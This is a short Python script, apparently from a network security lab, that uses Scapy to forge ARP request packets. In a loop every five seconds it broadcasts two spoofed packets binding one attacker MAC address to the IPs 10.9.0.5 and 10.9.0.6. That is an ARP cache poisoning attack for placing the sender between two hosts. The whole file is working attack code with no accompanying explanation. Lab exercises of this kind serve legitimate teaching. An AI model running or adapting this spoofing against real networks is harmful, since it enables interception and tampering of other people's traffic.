#!/usr/bin/env python3
from scapy.all import *

#First packet
E1 = Ether()
E1.dst = "ff:ff:ff:ff:ff:ff"
E1.src = "02:42:0a:09:00:69"

A1 = ARP()
A1.op = 1
A1.hwsrc = "02:42:0a:09:00:69"
A1.psrc = "10.9.0.5"
A1.hwdst = "02:42:0a:09:00:06"
A1.pdst = "10.9.0.6"

pkt1 = E1/A1

#Second packet
E2 = Ether()
E2.dst = "ff:ff:ff:ff:ff:ff"
E2.src = "02:42:0a:09:00:69"

A2 = ARP()
A2.op = 1
A2.hwsrc = "02:42:0a:09:00:69"
A2.psrc = "10.9.0.6"
A2.hwdst = "02:42:0a:09:00:05"
A2.pdst = "10.9.0.5"

pkt2 = E2/A2

#Loop
while True:
	sendp(pkt1)
	sendp(pkt2)
	time.sleep(5)

